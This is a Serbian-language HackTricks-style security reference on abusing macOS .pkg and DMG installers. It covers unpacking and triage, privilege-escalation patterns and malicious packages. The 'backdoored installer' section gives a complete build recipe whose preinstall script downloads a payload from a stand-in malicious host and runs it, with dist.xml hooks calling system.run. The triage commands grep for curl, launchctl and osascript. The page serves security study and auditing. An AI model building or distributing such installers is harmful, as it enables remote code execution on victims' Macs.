# Zloupotreba macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije o Pkg

macOS **installer package** (poznat i kao `.pkg` fajl) predstavlja format fajla koji macOS koristi za **distribuciju softvera**. Ovi fajlovi su poput **kutije koja sadrži sve što je nekom delu softvera** potrebno da bi se ispravno instalirao i pokrenuo.

Sam package fajl je arhiva koja sadrži **hijerarhiju fajlova i direktorijuma koji će biti instalirani na ciljnom** računaru. Takođe može da sadrži **skripte** za izvršavanje zadataka pre i posle instalacije, kao što su podešavanje konfiguracionih fajlova ili uklanjanje starih verzija softvera.

### Hijerarhija

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Prilagođavanja (naslov, tekst dobrodošlice…) i provere skripti/instalacije
- **PackageInfo (xml)**: Informacije, zahtevi za instalaciju, lokacija instalacije i putanje do skripti koje treba pokrenuti
- **Bill of materials (bom)**: Spisak fajlova koje treba instalirati, ažurirati ili ukloniti, zajedno sa dozvolama za fajlove
- **Payload (CPIO archive gzip compressed)**: Fajlovi koji se instaliraju u `install-location` iz PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Skripte za izvršavanje pre i posle instalacije i dodatni resursi koji se izdvajaju u privremeni direktorijum radi izvršavanja.

### Dekomprimovanje
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Da biste vizuelizovali sadržaj installer-a bez ručnog dekompresovanja, možete koristiti i besplatni alat [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Prečice za statičku trijažu

Ako je cilj analiza, pokušajte da **najpre izbegnete otvaranje package-a pomoću `Installer.app`**. Neki package-i mogu izvršiti code čim ih Installer otvori (na primer putem `system.run()` ili installer plug-in-ova), pa je offline ekstrakcija obično bezbednija početna tačka.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Osnovne informacije o DMG-u

DMG datoteke, odnosno Apple Disk Images, predstavljaju format datoteka koji Apple macOS koristi za slike diskova. DMG datoteka je u osnovi **slika diska koja se može montirati** (sadrži sopstveni sistem datoteka) i koja sadrži sirove blokovske podatke, obično kompresovane, a ponekad i šifrovane. Kada otvorite DMG datoteku, macOS je **montira kao da je fizički disk**, što vam omogućava pristup njenom sadržaju.

> [!CAUTION]
> Imajte na umu da **`.dmg`** installers podržavaju **veliki broj formata**, pa su u prošlosti neki od njih koji su sadržali ranjivosti bili zloupotrebljeni za dobijanje **kernel code execution**.

### Hijerarhija

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hijerarhija DMG datoteke može da se razlikuje u zavisnosti od sadržaja. Međutim, kod application DMG-ova obično prati ovu strukturu:

- Top Level: Ovo je root disk image-a. Često sadrži aplikaciju i eventualno link ka folderu Applications.
- Application (.app): Ovo je sama aplikacija. U macOS-u je aplikacija obično package koji sadrži veliki broj pojedinačnih datoteka i foldera koji čine aplikaciju.
- Applications Link: Ovo je prečica do foldera Applications u macOS-u. Svrha ove prečice je da vam olakša instalaciju aplikacije. Možete prevući .app datoteku na ovu prečicu da biste instalirali aplikaciju.

## Privesc via pkg abuse

### Izvršavanje iz javnih direktorijuma

Ako se pre-installation ili post-installation script, na primer, izvršava iz **`/var/tmp/Installerutil`**, a attacker može da kontroliše tu skriptu, može da eskalira privilegije svaki put kada se ona izvrši. Ili još jedan sličan primer:<sup>[1][3]</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Ovo je [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) koju će pozvati brojni installers i updaters kako bi **izvršili nešto kao root**. Ova funkcija prihvata **path** do **file-a** koji treba **izvršiti** kao parametar. Međutim, ako bi attacker mogao da **modifikuje** ovaj file, mogao bi da **zloupotrebi** njegovo izvršavanje sa root privilegijama radi **eskalacije privilegija**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Za više informacija pogledajte ovo predavanje: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[8]</sup>

### Zloupotreba okruženja i shebang-a

Savremeni PackageKit propusti pokazali su da se instalacione skripte često izvršavaju kao **trusted root code**, dok se u njihovoj blizini i dalje zadržava kontekst kojim upravlja napadač. Prilikom provere vendor paketa, obratite posebnu pažnju na:

- Shell interpretere kao što su `#!/bin/zsh` / `#!/bin/bash`
- Pozive poput `sudo -u $USER`, `launchctl asuser` ili bilo koju logiku koja veruje vrednostima `$USER`, `$HOME`, `PATH`, `TMPDIR` ili relativnim putanjama
- Non-shell interpretere koji mogu učitavati init fajlove ili biblioteke kojima upravlja korisnik
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Za grešku u PackageKit root-environment-u iz 2024. (`~/.zshenv` / `~/.bash*` nasleđivanje tokom instalacija koje pokreće korisnik), pogledajte [generičku macOS stranicu o privesc-u](../macos-privilege-escalation.md). Ako je paket **Apple-signed**, ista greška u skripti može postati **SIP/TCC-relevantna** jer `system_installd` može imati `com.apple.rootless.install.heritable`; pogledajte [SIP stranicu](../macos-security-protections/macos-sip.md).<sup>[5][6]</sup>

### Izvršavanje montiranjem

Ako installer upisuje u `/tmp/fixedname/bla/bla`, moguće je **kreirati mount** preko `/tmp/fixedname` sa opcijom noowners, čime biste mogli da **izmenite bilo koji fajl tokom instalacije** i zloupotrebite proces instalacije.

Primer za ovo je **CVE-2021-26089**, kojim je bilo moguće **prepisati periodic skriptu** i dobiti izvršavanje kao root. Za više informacija pogledajte predavanje: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[7]</sup>

## pkg kao malware

### Empty Payload

Moguće je jednostavno generisati **`.pkg`** fajl sa **pre i post-install skriptama**, bez stvarnog payload-a osim malware-a unutar samih skripti.

### JS u Distribution xml-u

Moguće je dodati **`<script>`** tagove u **distribution xml** fajl paketa; taj kod će se izvršiti i može **izvršavati komande** koristeći **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Kod distribution paketa ovo obično zavisi od toga da li top-level `Distribution` fajl omogućava spoljne skripte, na primer pomoću `allow-external-scripts="true"`. Zato pregled samo `preinstall` / `postinstall` skripti nije dovoljan: sam **Distribution XML** može sadržati `installation-check` / `volume-check` hook-ove i direktne putanje izvršavanja `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installer sa backdoorom

Zlonamerni installer koji koristi skriptu i JS kod unutar dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Exploiting Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Breaking SIP with Apple-signed Packages](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Death By 1000 Installers on macOS and it's all broken!](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
